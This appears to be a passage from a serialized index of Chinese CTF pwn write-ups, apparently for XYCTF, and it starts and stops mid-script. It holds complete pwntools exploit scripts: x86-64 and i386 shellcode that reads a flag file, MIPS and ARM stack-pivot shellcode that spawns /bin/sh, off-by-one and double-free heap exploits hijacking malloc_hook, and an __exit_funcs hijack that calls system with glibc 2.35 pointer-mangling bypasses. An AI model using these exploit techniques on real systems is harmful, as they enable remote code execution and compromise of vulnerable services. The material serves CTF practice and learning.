sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) # ru(b\\\"show your magic again\\\\n\\\") # # retfq 等效为 # # pop IP # # pop CS # # retfq无法跳转4字节以上的地址 # # 尝试fork一个新进程 # # puts函数 # # 0x114514000 # # \\\\x00 \\\\x40 \\\\x51 \\\\x13 cs:\\\\x01 # # eip rip cs:ip # # retfq ->cs位0x23 ip # # mov rax,[rbp+24] # # add rax,80 # # jmp rax # # 0x11451404d ->0x14514000 57次 # # # # b *0x114514061 # shellcode = asm(''' # mov r9d,0x0 # mov r8d,0xffffffff # mov ecx,0x22 # mov edx,0x7 # mov esi,0x1000 # movabs rax,0x14514000 # mov rdi,rax # mov rax,[rbp+24] # sub rax,647 # call rax # ''',arch=\\\"amd64\\\") # # 将内容赋值过去 # shellcode += asm( # ''' # mov rsi,0x11451406a; # mov rdi,0x14514000; # mov rcx,456 # copy_loop: # cmp rcx, 0 # je end_copy ; # mov al, [rsi] ; # mov [rdi], al ; # inc rsi ; # inc rdi ; # dec rcx ; # jmp copy_loop ; # end_copy: # mov rax,0x14514000 # jmp rax # ''' # ,arch=\\\"amd64\\\") # # 转化为32位 # shellcode +=asm( # ''' # push 0x23 # push 0x14514009 # retfq # ''' # ,arch=\\\"amd64\\\") # # 构造栈 # shellcode += asm( # ''' # mov esp,0x14514400 # mov ebp,0x14514420 # ''' # ,arch=\\\"i386\\\") # # 调用open函数 # shellcode += asm( # ''' # xor eax, eax ; # mov eax,0x5 ; # push 0x00006761; # push 0x6c662f2e; # mov ebx,esp; # mov edi,esp; # mov ecx, 0; # int 0x80; # ''',arch=\\\"i386\\\") # # read # shellcode += asm( # ''' # mov ebx,3; # mov ecx,esp; # mov edx,0x20; # mov eax,0x3; # int 0x80; # ''' # ,arch=\\\"i386\\\") # # write # shellcode +=asm( # ''' # mov ebx,1; # mov ecx,esp; # mov edx,0x20; # mov eax,0x4; # int 0x80; # ''' # ,arch=\\\"i386\\\") # payload = shellcode # payload = payload.ljust(0x160,b'\\\\x00') # payload += b\\\"\\\\x00\\\\x00./flag\\\\x00\\\\x00\\\\x00\\\" # print(payload) # sd(payload) # ru(b\\\"show your magic again\\\\n\\\") # shellcode= asm( # ''' # push 0x23 # ''' # ) # ia() # print(len(asm(shellcode,arch='amd64') ru(b\\\"show your magic again\\\\n\\\") # read函数 and sendfile函数 shellcode = asm( ''' mov rax, 0x67616c662f2e push rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 push 0x101 pop rax syscall mov rdi, 1 mov rsi, 3 push 0 mov rdx, rsp mov r10, 0x100 push 0x28 pop rax syscall mov rax,1 ''' ,arch=\\\"amd64\\\") sd(shellcode) ru(b\\\"}\\\") ia() \"]},\"269\":{\"h\":\"malloc_flag\",\"t\":[\"不懂为什么这题就只有30多解\",\"读取了flag而且写入了chunk中再把chunk free了 这个free chunk就进入了tcache 我们直接malloc一个大小一样的chunk 然后输出 就可以获取flag\",\"from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"\\\" port = 52689 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+516\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def recv_menu(): ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE9, 0x80, 0x89, 0xE9, 0xA1, 0xB9, 0x3A, 0x20])) def add(name,size): recv_menu() sl(b\\\"1\\\") # 请输入名字: ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20])) sl(str(name).encode()) # 请输入大小 (十进制或十六进制): ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE5, 0xA4, 0xA7, 0xE5, 0xB0, 0x8F, 0x20, 0x28, 0xE5, 0x8D, 0x81, 0xE8, 0xBF, 0x9B, 0xE5, 0x88, 0xB6, 0xE6, 0x88, 0x96, 0xE5, 0x8D, 0x81, 0xE5, 0x85, 0xAD, 0xE8, 0xBF, 0x9B, 0xE5, 0x88, 0xB6, 0x29, 0x3A])) sl(str(size).encode()) def delete(name): recv_menu() sl(b\\\"2\\\") ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE8, 0xA6, 0x81, 0xE9, 0x87, 0x8A, 0xE6, 0x94, 0xBE, 0xE7, 0x9A, 0x84, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20])) sl(str(name).encode()) def displayChunks(): recv_menu() sl(b\\\"3\\\") return rl() def displayChunk(name): recv_menu() sl(b\\\"4\\\") # 请输入要查看内容的内存块名字: ru(bytearray([0xE8, 0xAF, 0xB7, 0xE8, 0xBE, 0x93, 0xE5, 0x85, 0xA5, 0xE8, 0xA6, 0x81, 0xE6, 0x9F, 0xA5, 0xE7, 0x9C, 0x8B, 0xE5, 0x86, 0x85, 0xE5, 0xAE, 0xB9, 0xE7, 0x9A, 0x84, 0xE5, 0x86, 0x85, 0xE5, 0xAD, 0x98, 0xE5, 0x9D, 0x97, 0xE5, 0x90, 0x8D, 0xE5, 0xAD, 0x97, 0x3A, 0x20])) sl(str(name).encode()) return rl() add(1,0x100) res = displayChunk(1) print(res) ia() \"]},\"270\":{\"h\":\"EZ1.0?(mips)\",\"t\":[\"白给 一个栈迁移 然后到bss端执行shellcode\",\"本地bss没有可执行权限但是远程有 这题应该麻烦的是搭建mips环境\",\"import time from pwn import * context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context.terminal = ['byobu', 'sp', '-h'] # p = process([\\\"qemu-mipsel\\\", \\\"-g\\\", \\\"12345\\\", \\\"-L\\\", \\\"/usr/mipsel-linux-gnu/\\\", \\\"./mips\\\"]) # pwnlib.qemu.user_path(arch='mips') # pwnlib.qemu.ld_prefix(arch='mips') file_name = \\\"./mips\\\" url = \\\"127.0.0.1\\\" port = 50176 stack_addr = 0x7ffff000 # elf = ELF(file_name) # p= process(file_name) p = remote(url,port) payload=b\\\"b\\\"*0x40+p32(0x493400)+p32(0x400864) p.sendafter(b\\\"welcome XYCTF mips world\\\",payload) pause() payload=b\\\"a\\\"*0x44+p32(0x493460)+b\\\"\\\\x11\\\\x01\\\\x06\\\\x24\\\\xff\\\\xff\\\\xd0\\\\x04\\\\x00\\\\x00\\\\x06\\\\x24\\\\xe0\\\\xff\\\\xbd\\\\x27\\\\x14\\\\x00\\\\xe4\\\\x27\\\\x00\\\\x00\\\\x05\\\\x24\\\\xab\\\\x0f\\\\x02\\\\x24\\\\x0c\\\\x00\\\\x00\\\\x00/bin/sh\\\" p.send(payload) p.interactive() \"]},\"271\":{\"h\":\"EZ2.0?(arm)\",\"t\":[\"和mips一模一样 栈迁移 然后shellcode\",\"from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context( arch='arm', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./arm\\\" url = \\\"127.0.0.1\\\" port = 57621 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b vuln\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) bss = elf.bss() print(\\\"bss:\\\",hex(bss)) ru(b\\\"welcome XYCTF arm world\\\\n\\\") sd(b\\\"a\\\"*0x40+p32(bss+0x100+0x44)+p32(0x10588)) shellcode = b\\\"\\\\x02\\\\x20\\\\x42\\\\xe0\\\\x1c\\\\x30\\\\x8f\\\\xe2\\\" shellcode += b\\\"\\\\x04\\\\x30\\\\x8d\\\\xe5\\\\x08\\\\x20\\\\x8d\\\\xe5\\\" shellcode += b\\\"\\\\x13\\\\x02\\\\xa0\\\\xe1\\\\x07\\\\x20\\\\xc3\\\\xe5\\\" shellcode += b\\\"\\\\x04\\\\x30\\\\x8f\\\\xe2\\\\x04\\\\x10\\\\x8d\\\\xe2\\\" shellcode += b\\\"\\\\x01\\\\x20\\\\xc3\\\\xe5\\\\x0b\\\\x0b\\\\x90\\\\xef\\\" shellcode += b\\\"/bin/sh\\\" print(\\\"shellcode:\\\",shellcode) # input(\\\"test\\\") input(\\\"test\\\") payload = b\\\"a\\\"*0x40+p32(bss+0x100+0x44)+p32( 0x8afc4 )+shellcode sd(payload) ia() \"]},\"272\":{\"h\":\"one_byte\",\"t\":[\"写入chunk的时候多写了一位0 造成one_byte漏洞\",\"通过chunk进入unsortedbin中然后输出fd和bk泄露libc地址\",\"通过chunk进入tcache然后 malloc回来 然后输出chunk内容 泄露heap地址\"]},\"273\":{\"h\":\"劫持freechunk\",\"t\":[\"因为这题用的两个全局变量来存储的使用情况和chunk地址 我们不太方便伪造fake head来实现劫持\",\"因为存在off_by_one漏洞 我们可以利用合并机制 进行修改一些已经进入bin链的chunk 修改其fd 然后我们再通过malloc 就可以实现malloc下来一个任意地址 这里我们选择打malloc hook\",\"大致就是构造一个情况:a b c 三个chunk 然后ac都为unsortedbin chunk b为fastbin chunk然后让ac触发合并机制 把b包含在合并后的大chunk中 我们再将这个大chunk malloc下来 这样我们就可以修改b chunk了\",\"import time from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') # context(os='linux', arch='amd64', log_level='debug') context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 65030 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+34\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def recv_menu(): ru(b\\\">>> \\\") def debug(): gdb.attach(p,\\\"b *main+34\\\") input(\\\"stop\\\") def add(index,size): recv_menu() sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(str(size).encode()) print(\\\"---------------\\\\nadd chunk {}\\\\n---------------\\\".format(index)) def delete(index): recv_menu() sl(b\\\"2\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) print(\\\"---------------\\\\ndelete chunk {}\\\\n---------------\\\".format(index)) def edit(index,content): recv_menu() sl(b\\\"4\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) time.sleep(0.1) sd(content) def view(index,n): recv_menu() sl(b\\\"3\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) return rc(n) for i in range(11): add(i,0x100) for i in range(10): delete(i) # 0-7是占用状态 for i in range(7): add(i,0x100) add(7,0x100) res = view(7,0x10) base_libc = u64(res[:8])-2019072 print(\\\"base_libc:\\\",hex(base_libc)) res = view(3,0x10) base_heap = u64(res[:8]) - 1216 print(\\\"base_heap:\\\",hex(base_heap)) # 开始构造一个chunk处于fastbin中情况 for i in range(8): delete(i) delete(10) delete(11) print(\\\"占用的已经删除\\\") # 要实现tcache满 然后fastbin中存在 for i in range(7): add(i,0x78) for i in range(7,14): add(i,0x120) # prev_size size fd bk chunk_addr = base_heap fakechunk = b\\\"a\\\"*16+p64(0)+p64(721)+p64(base_heap+5696)+p64(base_heap+5696)+p64(base_heap+5664)*5 add(14,0x20) # 合并chunk add(15,0x120) edit(15,fakechunk) add(16,0x78) # 用于覆写 add(17,0x138) # 用于合并 add(18,0x120) add(19,0x20) for i in range(14): delete(i) delete(15) delete(16) # delete(1) delete(19) edit(17,b\\\"a\\\"*0x130+p64(720)+b\\\"\\\\x30\\\") print(\\\"base_heap:\\\",hex(base_heap)) print(\\\"base_libc:\\\",hex(base_libc)) delete(18) print(\\\"base_heap:\\\",hex(base_heap)) print(\\\"base_libc:\\\",hex(base_libc)) add(20,0x170) # 构造到malloc hook edit(20,b\\\"a\\\"*0x100+p64(0x130)+p64(0x80)+p64(base_libc+0x1ecb70-0x10)) print(\\\"base_heap:\\\",hex(base_heap)) print(\\\"base_libc:\\\",hex(base_libc)) for i in range(21,30): add(i,0x78) edit(29,p64(0xe3b01+base_libc)) add(30,0x20) ia() \"]},\"274\":{\"h\":\"ptmalloc2_its_myheap\",\"t\":[\"这题利用的一个head chunk进行记录信息 然后一个content chunk记录内容 而且没有对content chunk的size进行限制\",\"并且最重要的是在free的时候没有对chunk指针进行清空 这样我们可以实现uaf\",\"输出chunk内容的时候也是根据我们输入的size来进行输出的 所以可以泄露大量信息\",\"有一个gift函数 输出了libc地址 我们可以直接劫持gift函数和hello_world字符串来实现getshell\"]},\"275\":{\"h\":\"劫持head chunk\",\"t\":[\"由于信息都是通过head chunk进行的记录 所以我们直接劫持head chunk就可以实现任意free了 因为在free head chunk的时候会同步free head chunk记录的buf指针 我们劫持head chunk就可以任意修改buf指针完成任意free 这样我们可以轻松构造一个double free 实现任意写操作\",\"触发fastbin的合并\",\"我们可以让head chunk进入fastbin链中 然后通过申请一个largebin chunk触发合并机制 然后让这些chunk合并进入unsortedbin 我们再申请为 content chunk这样我们可以对这些原本的head chunk进行劫持\",\"构造double free\",\"任意free 让fastbin链中第二个chunk free来触发double free 劫持bss段数据\"]},\"276\":{\"h\":\"脚本\",\"t\":[\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') # context.terminal = ['byobu', 'sp', '-h'] # file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 64814 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+34\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def add(index,size,content): ru(b\\\">>> \\\") sl(b\\\"1\\\") ru(b\\\"[?] please input chunk_idx: \\\") sl(str(index).encode()) ru(b\\\"[?] Enter chunk size: \\\") sl(str(size).encode()) ru(b\\\"[?] Enter chunk data: \\\") sd(content) print(f\\\"----------\\\\n添加index为:{index}的chunk\\\\n----------\\\") def delete(index): ru(b\\\">>> \\\") sl(b\\\"2\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) print(f\\\"----------\\\\n删除index为{index}的chunk\\\\n----------\\\") def view(index): ru(b\\\">>> \\\") sl(b\\\"3\\\") ru(b\\\"[?] Enter chunk id: \\\") sl(str(index).encode()) res = rc(0x100) return res def gift(): ru(b\\\">>> \\\") sl(b\\\"114514\\\") return (ru(b\\\"\\\\n\\\")) def getData(bytes): data = [] for i in range(int(len(bytes)/8)): try: data.append(u64(bytes[i*8:(i+1)*8])) except: print(\\\"非预期数据\\\") return data # fastbin 的合并机制需要 在申请large chunk时 # 创建unsortedbin大小占满 并且多两个chunk for i in range(6): # 0x110大小chunk 8号就是我们要修改的chunk add(i,0x18,b\\\"a\\\") for i in range(6): delete(i) # 此时index为6的获取了 各个链的chunk add(6,0x500,b\\\"a\\\") print(\\\"获取一个大chunk装了heap\\\") res = view(6) addr_slice = getData(res) # 0xae4400 - 0xae4000 0x1baf400 base_heap = addr_slice[14] - 0x400 print(\\\"base_heap:\\\",hex(base_heap)) # x/10a &chunk_list 前6号占满 但是前五个isused为0 # 开始构造double free 先是取回所有的tcache 再占满tcache for i in range(5): add(i,0x18,b\\\"a\\\") for i in range(5): delete(i) # 此时fastbin有三个 tcache占满 我们malloc一个巨无霸然后就可以覆写fastbin fastbin情况:0xacf8e0 —▸ 0xacf8c0 —▸ 0xacf8a0 ◂— 0x0 print(\\\"占满tcache\\\") # chunk_list[4] 对应 这里paload偏移32位置 # 此时chunk_list使用情况: 6 7 处于使用状态 # 如果free则是free chunk_list[4] 所以我们要构造好这个chunk 让它绕过安全检测 所以我们构造size和prev_inuse位 然后再构造里面的fd让它指向fastbin chunk中第二个chunk fakechunk = {} fakechunk[\\\"size\\\"] = 0x31 fakechunk[\\\"prev_size\\\"] = 0 # 这里随意 fakechunk[\\\"chunk_list_size\\\"] = 0x20 fakechunk[\\\"isUsed\\\"] = 1 # 看下面的解释 fakechunk[\\\"buff\\\"] = base_heap+0xd10 # 要free的是:0x1279d00 链子:0x1279d20 —▸ 0x1279d00 变成:0x1279d00 —▸ 0x1279d20 ◂— 0x1279d00 add(7,0x430,b\\\"aaaaaaaa\\\"*2+p64(fakechunk[\\\"prev_size\\\"])+p64(fakechunk[\\\"size\\\"])+p64(fakechunk[\\\"chunk_list_size\\\"])+p64(fakechunk[\\\"isUsed\\\"])+p64(fakechunk[\\\"buff\\\"])+p64(0)+p64(0x20)) print(\\\"成功构造fake chunk \\\\ndouble free 的chunk指针:\\\",hex(fakechunk[\\\"buff\\\"])) # 构造两个fastbin的情况 for i in range(8,12): add(i,0x18,b\\\"a\\\") add(12,0x48,b\\\"a\\\") for i in range(8,13): delete(i) # fastbin:0x1603d20 —▸ 0x1603d00 heapbase:0x1603000 所以构造一个0x1603d00被free的情况 # 然后glibc 2.35版本下有fd加密 需要:堆地址>>12然后 ^我想要构造的fd print(\\\"构造成功两个fastbin的情况\\\") delete(4) for i in range(8,12): add(i,0x18,p64(base_heap>>12^0x404070)) add(13,0x38,b\\\"a\\\") res = gift() base_libc = int(res[-15:-1],16) -0x80E50 system_addr = base_libc +0x50D70 print(\\\"base_libc:\\\",hex(base_libc)) print(\\\"system_addr:\\\",hex(system_addr)) add(14,0x18,b\\\"/bin/sh\\\\x00\\\".ljust(8,b\\\"\\\\x00\\\")+p64(0)+p64(system_addr)) gift() ia() \"]},\"277\":{\"h\":\"ptmalloc2 it's myheap pro (glibc2.35下的exit函数打法)\"},\"278\":{\"h\":\"审题\",\"t\":[\"add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc\",\"image-20240418005442527\",\"delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空\",\"image-20240418005502800\",\"view函数 直接write出size大小的内容 存在泄露\",\"image-20240418005523801\",\"atexit函数\",\"image-20240418131700409\"]},\"279\":{\"h\":\"大致利用原理:\",\"t\":[\"这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调\",\"泄露libc heap地址\",\"通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址\",\"伪造fake chunk（消耗topchunk触发fastbin的合并）\",\"或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin\",\"因为题目中存在isUsed 有了这个就阻止了我们double free所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free\",\"劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表\",\"大概思路:exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)\",\"[原创] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式\"]},\"280\":{\"h\":\"泄露libc heap\",\"t\":[\"最简单的一步\",\"简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址\",\"for i in range(9): add(i,128,b\\\"a\\\"*0x18) for i in range(9): delete(i) # 泄露出chunk add(0,0x68,b\\\"a\\\"*8) res = view(0) base_heap = u64(res[2*8:3*8]) -1936 base_libc = u64(res[5*8:6*8]) -2206944 \",\"chunk进入unsortedbin\",\"image-20240418132947766\",\"free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可\",\"image-20240418133015055\",\"申请回来\",\"image-20240418133239908\",\"然后write直接泄露即可\"]},\"281\":{\"h\":\"伪造fake chunk\",\"t\":[\"最消耗时间的一步\",\"这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为头chunk 记录内容chunk的size isUsed point\",\"point指向的就是内容chunk\",\"为了绕过isUsed的检测 我们可以利用delete后没有清空的特性将原本的头chunk覆盖掉 这样就能随意控制isUsed和point了 实现任意free 所以我们选择触发fastbin的合并 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制内容chunk刚好为原本某一个的头chunk\"]},\"282\":{\"h\":\"示意图\",\"t\":[\"image-20240418134333731\",\"这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了\"]},\"283\":{\"h\":\"fastbin合并机制\",\"t\":[\"范围:2.35\",\"我们可以通过申请large bin chunk 来触发合并\",\"我们可以通过让topchunk消耗完毕 然后触发合并\",\"由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk\",\"Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式\",\"连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并\",\"# tcache 0x20 0x90均存满 # 剩下0xf3c7d0 for i in range(760): add(14,128,b\\\"a\\\"*0x18) for i in range(6): add(i,0x18,b\\\"a\\\"*0x8) # 防止fastbin合并后直接被topchunk合并 add(7,8,b\\\"a\\\"*8) for i in range(6): delete(i) add(14,128,b\\\"a\\\"*8) add(14,0x30,b\\\"a\\\"*8) \",\"合并之前\",\"image-20240418151026231\",\"合并后\",\"image-20240418151102406\"]},\"284\":{\"h\":\"构造fakecchunk\",\"t\":[\"fakechunk = {} fakechunk[\\\"size\\\"] = p64(0x21) fakechunk[\\\"prev_size\\\"] = p64(0) fakechunk[\\\"chunk_list_size\\\"] = p64(0x100) fakechunk[\\\"isUsed\\\"] = p64(1) // 为触发泄露tls+0x30的double free的fastbinchunk地址 fakechunk[\\\"buff\\\"] = p64(fd) # 已经完成覆写 free index5则可实现任意free add(14,0x58,b\\\"a\\\"*16+fakechunk[\\\"prev_size\\\"]+fakechunk[\\\"size\\\"]+fakechunk[\\\"chunk_list_size\\\"]+fakechunk[\\\"isUsed\\\"]+fakechunk[\\\"buff\\\"]) \",\"此时index为5 就是我们劫持的头chunk 这里的fd就是我们后面要free的任意chunk\",\"image-20240418151731938\"]},\"285\":{\"h\":\"泄露tls+0x30\",\"t\":[\"由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域\",\"难点\",\"我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大\",\"实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc\",\"glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap>>12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差\",\"# 构造一个double free for i in range(6,11): add(i,0x18,b\\\"a\\\"*16) # 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除 add(14,0x68,p64(0)+p64(0x100)+p64((xor-0x21)^(tls+0x30))) for i in range(6,11): delete(i) delete(5) for i in range(7): add(i,0x48,b\\\"a\\\"*8) add(7,0x48,p64((xor)^(tls))) for i in range(2): add(i,0x48,b\\\"a\\\"*8) add(0,0x48,b\\\"\\\\x00\\\") # 泄露tls中信息 res = view(0) \",\"首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）\",\"if (__builtin_expect(old == p, 0)) malloc_printerr(\\\"double free or corruption (fasttop)\\\"); p->fd = PROTECT_PTR(&p->fd, old); *fb = p; \",\"image-20240420123457567\",\"然后将利用开始构造好的fakechunk进行free\",\"delete(5) \",\"image-20240420123602766\"]},\"286\":{\"h\":\"fd加密机制\",\"t\":[\"glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可\",\"fd需要是heap基地址^目标地址\"]},\"287\":{\"h\":\"劫持exit_funcs链表\",\"t\":[\"最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写\",\"本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来\",\"难点 \",\"因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了\",\"# size: 0x20c30 for i in range(758): add(14,128,b\\\"a\\\"*8) for i in range(11): add(i,0x18,b\\\"a\\\"*8) add_with_no_chunk(14) for i in range(11): delete(i) # 将topchunk消耗空触发合并 add(14,0x68,b\\\"a\\\"*8) # 指定free index 6 可以实现任意free # free_chunk就是后续构造double free的chunk地址 free_chunk = base_heap+271376+0x10 add(14,128,b\\\"a\\\"*8*4+p64(0)+p64(0x31)+p64(0x100)+p64(1)+p64(free_chunk)) # 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数 for i in range(6): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(7,13): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(6): delete(i) for i in range(7,13): delete(i) # 触发double free delete(6) for i in range(7): add(i,0x68,b\\\"a\\\"*8) # 将fd指向exit_function地址处 add(i,0x68,p64((xor+0x21)^exit_function)) add(0,0x68,b\\\"a\\\"*8) add(0,0x68,b\\\"/bin/sh\\\\x00\\\") res = getData(res) # 获取key的值 res = res[6] # 计算出key加密后的地址 manba = remove_high_digits(rol(0x401700^res),16) addr = remove_high_digits(rol(system_addr^res),16) print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) add(0,0x68,p64(4)+p64(addr)+p64(base_heap+0x42420)) ru(b\\\">>> \\\") sl(b\\\"5\\\") print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) ia() \"]},\"288\":{\"h\":\"ptmalloc2 it's myheap plus（orw+exit）\",\"t\":[\"相对于ptmp只是多了一个sandbox限制 就和Arahat0师傅文章中的流程一模一样 多了一个orw的利用 大致原理都是相同的\",\"值得一提的是本地通了但是远程打了好久没通后面发现远程不让我以rw的方式打开flag 而是只允许我以r方式打开\",\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] # file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 49979 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+34\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, 